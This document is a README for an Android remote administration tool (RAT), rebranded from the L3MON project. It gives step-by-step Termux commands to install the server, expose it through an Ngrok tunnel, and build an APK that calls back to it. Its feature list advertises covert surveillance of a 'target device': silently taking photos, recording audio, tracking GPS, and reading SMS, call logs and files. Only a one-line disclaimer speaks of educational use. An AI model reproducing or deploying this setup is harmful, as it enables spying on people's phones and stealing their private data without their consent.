# 🤖 HCO-ANDRO-SERVER V1.0
**Advanced Android Remote Administration Tool (RAT)**
*Developed for the HCF & HCO Community*

---

## 🛠️ Installation Guide (Step-by-Step)

### 1. Environment Setup
Open Termux and execute the following commands to install required packages and the PM2 process manager:
```bash
apt update && apt upgrade -y
pkg install nodejs git python openjdk-17 -y
npm install pm2 -g

```
2. Download and Configure HCO-ANDRO-SERVER
​Clone the repository and set up the core engine with custom branding:

# Clone the repository
```
git clone [https://github.com/Your-Username/HCO-ANDRO-SERVER.git](https://github.com/Your-Username/HCO-ANDRO-SERVER.git)
```
# Enter the directory
```
cd HCO-ANDRO-SERVER
```
# Fetch and setup the core engine
```
git clone [https://github.com/D3VL/L3MON.git](https://github.com/D3VL/L3MON.git) .core_engine

mv .core_engine/* .

rm -rf .core_engine
```
# Apply Custom Branding (Rename L3MON to HCO-ANDRO-SERVER)
sed -i 's/L3MON/HCO-ANDRO-SERVER/g' server/views/*.ejs

# Install server-side dependencies
```
cd server
npm install
```
3. Start the Server
​To launch the HCO-ANDRO-SERVER dashboard, use the following command:

# Ensure you are inside the 'server' folder
```
pm2 start index.js --name "HCO-SERVER"
```
4. Accessing the Control Panel
​Once the server is running, open your mobile browser (Chrome/Kiwi) and navigate to:
```
URL: http://localhost:22533
```
​Default Login Credentials:
​Username: admin
​Password: admin
​🌐 Remote Access Setup (Port Forwarding)
​To control a device outside your local Wi-Fi network, you must use Ngrok:
​Open a new session in Termux and install Ngrok:
```
pkg install wget
wget [https://bin.equinox.io/c/4VmD4z7iaB/ngrok-stable-linux-arm64.tgz](https://bin.equinox.io/c/4VmD4z7iaB/ngrok-stable-linux-arm64.tgz)
tar -xvzf ngrok-stable-linux-arm64.tgz
```
2. Authenticate and start the tunnel:
./ngrok authtoken YOUR_NGROK_AUTH_TOKEN
./ngrok http 22533

Note: Use the forwarding URL provided by Ngrok when building your APK.

🚀 Features at a Glance
Live Dashboard: Monitor all connected devices in real-time.
File Explorer: Download, upload, or delete files remotely.
SMS & Call Logs: Access private messages and call history instantly.
Camera Access: Capture high-quality photos from front and rear cameras silently.
Microphone: Record audio clips from the target device.
GPS Tracking: Get precise real-time location of the target.
🛡️ Disclaimer: This tool is intended for educational purposes and authorized security testing only. Unauthorized access to any device is illegal and may lead to legal consequences.

### CODE by AZHAR 👨‍💻
